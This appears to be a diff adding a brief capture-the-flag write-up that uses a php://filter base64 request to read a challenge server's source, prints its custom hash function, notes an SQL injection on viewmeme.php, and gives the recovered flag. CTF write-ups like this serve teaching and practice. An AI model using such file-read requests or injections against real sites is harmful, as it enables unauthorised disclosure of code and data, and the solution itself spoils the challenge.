@@ -1,0 +1,24 @@
+use the php://filter/ exploit to view source code of pages
+
+http://45.55.220.250/php://filter/convert.base64-encode/resource=hash
+lets us see the hashing function
+
+function myhash($string)
+{
+    $result = "0";
+    $l = strlen($string);
+    for ($x = 0; $x <= $l; $x++) {
+        $term = bcmod(bcmul("256", bcpow( (string)(ord($string[$x])), (string)($l-$x))), "1000000000000000000000000000000");
+        $result = bcadd($result, $term);
+    }
+    return $result;
+}
+
+http://45.55.220.250/php://filter/convert.base64-encode/resource=add
+lets us see that files have the same name as the password hash
+
+SQL injection on the viewmeme.php page lets us grab a list of all filenames.
+
+One of the images has part of the flag: iz_to0_harD_4_me}, and its hash is 3330835219394637186137533052672
+
+We reverse the hash function to recover the second part: flag{P4s5worD_Ha$h1ng_
